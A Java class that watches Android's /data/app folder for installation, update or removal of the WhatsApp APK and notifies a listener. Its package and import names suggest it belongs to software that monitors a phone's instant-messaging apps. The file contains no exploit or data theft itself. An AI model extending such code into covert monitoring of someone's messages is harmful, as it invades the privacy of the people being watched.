package com.vvt.whatsapp;

import com.vvt.im.Customization;
import com.vvt.imfileobserver.ImUtil;
import com.vvt.imfileobserver.MonitoringApkFile;
import com.vvt.imfileobserver.MonitoringApkListener;
import com.vvt.logger.FxLog;

public class WhatAppMonitoringApk implements MonitoringApkListener {

	/*=========================== CONSTANT ===============================*/
	private static final String TAG = "WhatAppMonitoringApk";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	public static final String APK_FOLDER_PATH = "/data/app";
	public static final String WA_APK_NAME = "com.whatsapp";
	
	/*=========================== MEMBER ===============================*/
	private  boolean apkFileIsAlreadyHave_Flag;
	private  boolean unRegisObserverByFileObserver_Flag;
	private static WhatAppMonitoringApk sMonitoringApkFileObserver;
	private static MonitoringApkFile sMonitoringApkFile;
	
	private WhatsAppManagerListener mWhatsAppManagerListener;
	
	/*============================ METHOD ================================*/
	/**
	 * get MonitoringApkFileObserver object.
	 */
	public static WhatAppMonitoringApk getMonitoringApkFileObserver(WhatsAppManagerListener listener) {
		
		if (sMonitoringApkFileObserver == null) {
			sMonitoringApkFileObserver = new WhatAppMonitoringApk(listener);
		}
		return sMonitoringApkFileObserver;
	}
	
	private WhatAppMonitoringApk(WhatsAppManagerListener listener) {
		mWhatsAppManagerListener = listener;
		apkFileIsAlreadyHave_Flag = false;
		unRegisObserverByFileObserver_Flag = false;
		sMonitoringApkFile = MonitoringApkFile.getInstance();
	}
	
	public void setFlagApkFileIsAlreadyHave(boolean isAlreadyHave) {
		apkFileIsAlreadyHave_Flag = isAlreadyHave;
	}
	
	public boolean getFlagApkFileIsAlreadyHave() {
		return apkFileIsAlreadyHave_Flag;
	}
	
	public void setFlagUnRegisObserverByFileObserver(boolean isUnRegisByFileObserver) {
		unRegisObserverByFileObserver_Flag = isUnRegisByFileObserver;
	}
	
	public boolean getFlagUnRegisObserverByFileObserver() {
		return unRegisObserverByFileObserver_Flag;
	}
	
	public void registerObserver() {
		if(LOGV) FxLog.v(TAG,"registerObserver # ENTER ...");
		if(sMonitoringApkFile == null) {
			sMonitoringApkFile = MonitoringApkFile.getInstance();
		}
		
		if(sMonitoringApkFile.register(this, WA_APK_NAME)){
			if(LOGV) FxLog.v(TAG,"registerObserver # registerObserver Success!");
			
			if (sMonitoringApkFile.startObserver()) {
				if(LOGV) FxLog.v(TAG,"registerObserver # startObserver Success!");
			} else {
				if(LOGD) FxLog.d(TAG,"registerObserver # startObserver Fail!.");
			}
		} else {
			if(LOGD) FxLog.d(TAG,"registerObserver # registerObserver Fail!");
		}
		if(LOGV) FxLog.v(TAG,"registerObserver # EXIT ...");
	}
	
	public boolean unregisterObserver() {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # ENTER ...");
	
		if (sMonitoringApkFile.unregister(this, WA_APK_NAME)) {
			if(LOGV) FxLog.v(TAG,"registerObserver # UnregisterObserver Success!");
			
			if(sMonitoringApkFile.stopObserver()) {
				if(LOGV) FxLog.v(TAG,"registerObserver # stopObserver Success!.");
			} else {
				if(LOGD) FxLog.d(TAG,"registerObserver # stopObserver Fail!.");
			}
		} else {
			if(LOGD) FxLog.d(TAG,"registerObserver # UnregisterObserver Fail!.");
		}
		sMonitoringApkFile = null;
		sMonitoringApkFileObserver = null;
		if(LOGV) FxLog.v(TAG, "unregisterObserver # EXIT ...");
		return true;
	}
	
	private void onDeleteWhatsAppFile() {
		unRegisObserverByFileObserver_Flag = true;
		apkFileIsAlreadyHave_Flag = false;
		mWhatsAppManagerListener.onApkFileChange(false);
		
		boolean isStillHaveFile = ImUtil.isHaveFileName(APK_FOLDER_PATH,WA_APK_NAME);
			
		//May be it can be an Update Event, so It can have file APK more than one.
		if(isStillHaveFile) {
			apkFileIsAlreadyHave_Flag = true;
			mWhatsAppManagerListener.onApkFileChange(true);
		}
	}

	@Override
	public void onApkFileChange(boolean isCreate, String path) {
		if(isCreate){
			if(LOGV) FxLog.v(TAG, "onApkFileChange # FileObserver.CREATE");			
			
			boolean isHaveFile = ImUtil.isHaveFileName(APK_FOLDER_PATH,
					WA_APK_NAME);

			if (isHaveFile && !apkFileIsAlreadyHave_Flag) {
				apkFileIsAlreadyHave_Flag = true;
				mWhatsAppManagerListener.onApkFileChange(true);
			}	
		}
		
		if(!isCreate) {
			if(LOGV) FxLog.v(TAG, "onApkFileChange # FileObserver.DELETE, path :" + path);
			onDeleteWhatsAppFile();
		}
	}
}
